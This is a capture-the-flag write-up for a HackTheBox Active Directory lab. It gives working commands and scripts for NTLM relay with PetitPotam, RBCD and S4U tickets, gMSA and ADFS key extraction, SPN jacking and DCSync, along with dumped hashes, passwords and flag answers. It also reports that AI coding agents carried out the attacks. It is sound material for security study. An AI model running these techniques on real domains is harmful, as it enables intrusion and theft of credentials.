# HackTheBox: Pirate - Writeup

**Difficulty:** Insane
**OS:** Windows Server 2019
**Tags:** Active Directory, ADFS, NTLM Relay, Constrained Delegation, SPN Jacking, WID, gMSA

---

## Summary

Pirate is an Insane-rated Windows Active Directory box featuring a two-machine environment: DC01 (domain controller) and WEB01 (ADFS server on an internal network). The attack chain involves discovering Pre-Windows 2000 machine account passwords, extracting gMSA credentials, accessing ADFS internals through the Windows Internal Database, NTLM relay with Resource-Based Constrained Delegation to compromise WEB01, and finally SPN Jacking to abuse constrained delegation and gain Domain Admin on DC01.

## Box Info

| Property | Value |
|----------|-------|
| IP | 10.129.244.95 |
| Domain | pirate.htb |
| DC | DC01.pirate.htb (10.129.244.95) |
| ADFS/Web | WEB01 (192.168.100.2 - internal) |
| CA | pirate-DC01-CA |

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -Pn -p- 10.129.244.95
```

Key ports: 53, 80, 88, 135, 139, 389, 443, 445, 464, 636, 5985, 9389
Standard AD domain controller with IIS (port 80) and HTTPS (port 443).

### Initial Credentials

Given in scope: `pentest / p3nt3st2025!&` (Domain Users, no special privileges).

### BloodHound

```bash
bloodhound-python -u pentest -p 'p3nt3st2025!&' -d pirate.htb -ns 10.129.244.95 -c All --zip
```

BloodHound revealed the intended attack path:
```
a.white --ForceChangePassword--> a.white_adm --ConstrainedDeleg--> HTTP/WEB01
```

Key users:
- **a.white** - Has ForceChangePassword on a.white_adm
- **a.white_adm** - IT group member, constrained delegation to HTTP/WEB01, TRUSTED_TO_AUTH_FOR_DELEGATION
- **gMSA_ADFS_prod$** / **gMSA_ADCS_prod$** - Remote Management Users (WinRM on DC01)

---

## Foothold: Pre-Windows 2000 Machine Accounts

Enumeration revealed MS01$ and EXCH01$ in the "Pre-Windows 2000 Compatible Access" group. These accounts have default passwords matching the lowercase machine name.

```bash
# MS01$ password = "ms01", EXCH01$ password = "exch01"
# Machine accounts can't SMB login, but CAN get Kerberos TGTs
impacket-getTGT 'pirate.htb/MS01$:ms01' -dc-ip 10.129.244.95
```

MS01$ is a member of "Domain Secure Servers" which grants **ReadGMSAPassword** rights.

### gMSA Password Extraction

```bash
export KRB5CCNAME=MS01$.ccache
nxc ldap dc01.pirate.htb -k --use-kcache --gmsa
```

| gMSA Account | NT Hash |
|-------------|---------|
| gMSA_ADFS_prod$ | `8126756fb2e69697bfcb04816e685839` |
| gMSA_ADCS_prod$ | `304106f739822ea2ad8ebe23f802d078` |

Both accounts are in Remote Management Users, granting WinRM access to DC01 (non-admin).

### Internal Network Discovery

WinRM to DC01 revealed WEB01 (192.168.100.2) on the internal network running ADFS. A ligolo-ng tunnel was established to reach it:

```bash
# Upload agent to DC01 via evil-winrm, start tunnel
./proxy -selfcert -laddr 0.0.0.0:8081
# Add route: sudo ip route add 192.168.100.0/24 dev ligolo
```

---

## ADFS Deep Dive

gMSA_ADFS_prod$ has WinRM on WEB01, where ADFS runs with a Windows Internal Database (WID).

### WID Database Access

The gMSA service account has **full CRUD** on all 52 WID tables, providing access to the entire ADFS configuration.

```powershell
# WID query (via evil-winrm on WEB01)
$cs="Server=np:\\.\pipe\MICROSOFT##WID\tsql\query;Database=AdfsConfigurationV4;Integrated Security=True"
$c=New-Object System.Data.SqlClient.SqlConnection($cs); $c.Open()
$q=$c.CreateCommand(); $q.CommandText="SELECT * FROM ServiceSettings"; $r=$q.ExecuteReader()
```

### ADFS Signing Key Extraction

1. Extracted the DKM (Distributed Key Management) key from AD:
   - `fFtRNXRYzZjwD37MB/Rgu/x96WiVB0xO/SkbWnU6LOQ=`
2. Retrieved the encrypted token-signing certificate PFX from WID
3. Decrypted using the DKM key to obtain the ADFS token-signing private key

With the signing key, arbitrary SAML/JWT tokens can be forged as any user (Golden SAML).

---

## User Flag: NTLM Relay + RBCD on WEB01

WEB01 has **SMB signing disabled** (server-side), making it a relay target. The attack uses PetitPotam to coerce WEB01's machine account to authenticate, then relays that to DC01 LDAP to set up Resource-Based Constrained Delegation.

### Step 1: Set Up Relay

```bash
ntlmrelayx.py -t ldap://10.129.244.95 --delegate-access --remove-mic -smb2support
```

### Step 2: Coerce WEB01

PetitPotam from DC01's WinRM session to coerce WEB01 to authenticate back to our Kali IP. WEB01's traffic routes through DC01 (default gateway 192.168.100.1).

```bash
python3 PetitPotam.py -u '' -p '' -d '' KALI_IP 192.168.100.2
```

### Step 3: RBCD + S4U

ntlmrelayx receives WEB01$ authentication, creates computer account `OLDWWINV$`, and sets `msDS-AllowedToActOnBehalfOfOtherIdentity` on WEB01$.

```bash
impacket-getST 'pirate.htb/OLDWWINV$' -spn cifs/WEB01.pirate.htb \
  -impersonate Administrator -dc-ip 10.129.244.95 \
  -hashes :dc99c4c4d93eed8506c1f53fcbd2fbae
```

### Step 4: Secrets Dump

```bash
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
impacket-secretsdump -k -no-pass pirate.htb/Administrator@WEB01.pirate.htb
```

This revealed **a.white's cleartext password** stored as the DefaultPassword LSA secret (autologin):

```
DefaultPassword: PIRATE\a.white : E2nvAOKSz5Xz2MJu
```

**user.txt: `5fc90264057fda4207981f25728087be`**

---

## Root Flag: SPN Jacking to Domain Admin

### Step 1: ForceChangePassword

With a.white's password, change a.white_adm's password via SAMR:

```python
from impacket.dcerpc.v5 import samr, transport

rpctransport = transport.SMBTransport('10.129.244.95', filename=r'\samr')
rpctransport.set_credentials('a.white', 'E2nvAOKSz5Xz2MJu', 'pirate.htb')
dce = rpctransport.get_dce_rpc()
dce.connect()
dce.bind(samr.MSRPC_UUID_SAMR)
# ... open domain, find a.white_adm, set password
samr.hSamrSetPasswordInternal4New(dce, userHandle, 'Str0ngP@ss99')
```

### Step 2: Discover ACLs

a.white_adm is in the **IT group**, which has `WriteProperty` on `servicePrincipalName` for all computer accounts (DC01$, WEB01$, MS01$, EXCH01$).

```bash
bloodyAD -d pirate.htb -u a.white_adm -p 'Str0ngP@ss99' --host 10.129.244.95 get writable --detail
```

```
distinguishedName: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
servicePrincipalName: WRITE
```

### Step 3: SPN Jacking

a.white_adm has constrained delegation configured to `HTTP/WEB01`. By moving that SPN from WEB01$ to DC01$, the KDC will resolve S4U2Proxy requests to DC01$, encrypting the service ticket with DC01$'s key instead of WEB01$'s.

```python
import ldap3

s = ldap3.Server('pirate.htb')
c = ldap3.Connection(s, user='PIRATE\\a.white_adm', password='Str0ngP@ss99',
                     authentication=ldap3.NTLM)
c.bind()

# Remove HTTP/WEB01 SPNs from WEB01$
c.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/WEB01', 'HTTP/WEB01.pirate.htb'])]})

# Add them to DC01$
c.modify('CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_ADD, ['http/WEB01', 'http/WEB01.pirate.htb'])]})
```

### Step 4: S4U2Proxy + altservice

Request a service ticket for HTTP/WEB01 (now resolves to DC01$), then change the service name to LDAP/DC01 for DCSync:

```bash
impacket-getST 'pirate.htb/a.white_adm:Str0ngP@ss99' \
  -spn HTTP/WEB01.pirate.htb -impersonate Administrator \
  -altservice ldap/DC01.pirate.htb -dc-ip 10.129.244.95
```

### Step 5: DCSync

```bash
export KRB5CCNAME=Administrator@ldap_DC01.pirate.htb@PIRATE.HTB.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.244.95 pirate.htb/Administrator@DC01.pirate.htb
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:598295e78bd72d66f837997baf715171:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:33071738496aba54a991ccc80875c97e:::
```

### Step 6: Read root.txt

```bash
impacket-smbclient pirate.htb/Administrator@DC01.pirate.htb -hashes :598295e78bd72d66f837997baf715171
# use C$
# cd Users\Administrator\Desktop
# get root.txt
```

**root.txt: `2dfd4a54ac693a7fe08f8fefce7a2dff`**

---

## Full Attack Chain

```
pentest (Domain Users)
  |
  | Enumerate Pre-Windows 2000 Compatible Access
  v
MS01$ (pw: "ms01")
  |
  | Kerberos TGT -> ReadGMSAPassword (Domain Secure Servers)
  v
gMSA_ADFS_prod$ (NT hash)
  |
  | WinRM on DC01+WEB01 (non-admin) -> WID database access
  v
ADFS Signing Key (Golden SAML capability)
  |
  | Ligolo tunnel to internal network (192.168.100.0/24)
  | PetitPotam coerce WEB01 -> ntlmrelayx to DC01 LDAP -> RBCD
  v
Administrator on WEB01 (secretsdump)
  |
  | LSA DefaultPassword -> a.white cleartext
  | user.txt
  v
a.white -> ForceChangePassword -> a.white_adm
  |
  | IT group -> WriteSPN on DC01$
  | SPN Jacking: move HTTP/WEB01 from WEB01$ to DC01$
  | S4U2Proxy -altservice ldap/DC01 -> DCSync
  v
Domain Admin on DC01 -> root.txt
```

---

## Key Techniques

| Technique | Description |
|-----------|-------------|
| Pre-Windows 2000 Passwords | Machine accounts in this group have predictable default passwords |
| gMSA Password Reading | Accounts with ReadGMSAPassword can extract the managed password hash |
| WID Manipulation | ADFS service account has full access to the config database |
| NTLM Relay + RBCD | Coerce authentication via PetitPotam, relay to LDAP, set delegation |
| SPN Jacking | Move an SPN between computer accounts to redirect constrained delegation |
| S4U2Proxy + altservice | Impersonate users across services with ticket service name substitution |

## Agent Architecture

This box was solved using parallel Claude Code agents for maximum efficiency. The methodology is documented in [`agent-methodology.md`](Agent-Methodology.md). Key patterns used:

- **Phase 2 (Session 7 attack vectors):** 3 parallel agents — NTLM relay, web app investigation, and DRS/device registration. The relay agent captured user.txt while the other two correctly identified dead ends, saving hours of sequential exploration.
- **Phase 3 (DC01 escalation):** Analyst + Operator dual agents. The analyst mapped all ACLs and confirmed SPN write was the viable path. The operator executed the SPN jacking attack and captured root.txt. Both ran simultaneously.

---

## Rabbit Holes

- **ADCS ESC1**: ADFSSSLSigning template has EnrolleeSuppliesSubject but only Server Auth EKU (no Client Auth = no PKINIT)
- **DRS Device Registration**: Endpoints exist but DRS was never initialized in AD (no containers, no service objects)
- **ADFS CA / Windows Hello**: CA module disabled in ADFS config, no certificate provisioning
- **Shadow Credentials**: No writable msDS-KeyCredentialLink on target users
- **Pirate School Marks Portal**: RP trust in WID but no actual web application behind it
- **Kerberoast a.white_adm**: RC4 hash obtained but won't crack with standard wordlists
